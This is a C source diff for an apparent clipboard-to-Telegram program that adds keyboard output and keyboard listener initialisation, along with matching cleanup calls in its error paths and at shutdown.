@@ -16,6 +16,9 @@
  */
 
 #include "clipboard/clipboard.h"
+#include "clipboard/clipboard_output.h"
+#include "keyboard/keyboard.h"
+#include "keyboard/keyboard_output.h"
 #include "config/config.h"
 #include "logging/logging.h"
 #include "logging/log_sender.h"
@@ -214,8 +217,16 @@ static void print_usage(FILE *stream)
         if (!is_worker) c2t_runtime_release();
         return 1;
     }
+    if (!keyboard_output_init()) {
+        c2t_log_error("main", "Keyboard delivery worker initialization failed");
+        clipboard_output_cleanup();
+        telegram_cleanup();
+        if (!is_worker) c2t_runtime_release();
+        return 1;
+    }
     if (!c2t_log_sender_init()) {
         c2t_log_error("main", "Log sender initialization failed");
+        keyboard_output_cleanup();
         clipboard_output_cleanup();
         telegram_cleanup();
         if (!is_worker) c2t_runtime_release();
@@ -224,10 +235,14 @@ static void print_usage(FILE *stream)
     if (!c2t_telegram_listener_init()) {
         c2t_log_error("main", "Telegram command listener initialization failed");
         c2t_log_sender_cleanup();
+        keyboard_output_cleanup();
         clipboard_output_cleanup();
         telegram_cleanup();
         if (!is_worker) c2t_runtime_release();
         return 1;
+    }
+    if (!keyboard_listener_init()) {
+        c2t_log_warning("main", "Keyboard listener initialization failed (continuing)");
     }
 
     if (!is_worker)
@@ -235,8 +250,10 @@ static void print_usage(FILE *stream)
     c2t_log_info("main", "Starting clipboard listener");
     int result = clipboard_listen();
     c2t_log_info("main", "Clipboard listener stopped with result %d", result);
+    keyboard_listener_cleanup();
     c2t_telegram_listener_cleanup();
     c2t_log_sender_cleanup();
+    keyboard_output_cleanup();
     clipboard_output_cleanup();
     telegram_cleanup();
     c2t_log_info("main", "Shutdown complete");
